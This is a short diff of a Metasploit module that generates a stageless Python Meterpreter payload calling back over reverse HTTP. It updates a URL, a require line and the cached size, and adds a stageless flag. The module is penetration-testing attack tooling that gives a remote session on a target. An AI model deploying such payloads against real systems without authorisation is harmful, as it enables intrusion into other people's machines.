@@ -1,9 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/reverse_http'
 require 'msf/core/payload/python'
 require 'msf/core/payload/python/meterpreter_loader'
@@ -12,7 +11,7 @@ require 'msf/base/sessions/meterpreter_python'
 
 module MetasploitModule
 
-  CachedSize = 51758
+  CachedSize = 54554
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -38,10 +37,10 @@ module MetasploitModule
       url:             generate_callback_url(opts),
       http_user_agent: opts[:user_agent],
       http_proxy_host: opts[:proxy_host],
-      http_proxy_port: opts[:proxy_port]
+      http_proxy_port: opts[:proxy_port],
+      stageless:       true
     })
 
     py_create_exec_stub(met)
   end
-
 end
